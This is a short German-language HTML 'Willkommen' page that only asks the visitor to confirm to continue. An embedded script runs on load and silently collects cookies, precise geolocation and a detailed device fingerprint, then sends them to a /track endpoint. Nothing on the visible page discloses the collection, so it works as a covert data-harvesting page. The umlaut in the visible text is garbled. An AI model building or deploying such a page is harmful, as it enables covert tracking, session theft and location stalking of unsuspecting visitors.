<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Willkommen</title>
</head>
<body>
  <h1>Willkommen</h1>
  <p>Best√§tigen um Fortzufahren.</p>

  <script>
    function collectData() {
      const data = {
        lat: null,
        lon: null,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: JSON.stringify(navigator.languages),
        cookies: document.cookie,
        screen: JSON.stringify({
          width: window.screen.width,
          height: window.screen.height,
          colorDepth: window.screen.colorDepth
        }),
        window: JSON.stringify({
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight
        }),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: JSON.stringify(navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : 'unknown'),
        referrer: document.referrer,
        timestamp: new Date().toISOString()
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            sendData(data);
          },
          (err) => {
            console.error('Geolocation-Fehler:', err);
            sendData(data);
          }
        );
      } else {
        sendData(data);
      }
    }

    function sendData(data) {
      const queryString = new URLSearchParams(data).toString();
      fetch(`/track?${queryString}`)
        .then(() => console.log('Daten gesendet'))
        .catch(err => console.error('Fehler:', err));
    }

    window.onload = collectData;
  </script>
</body>
</html>




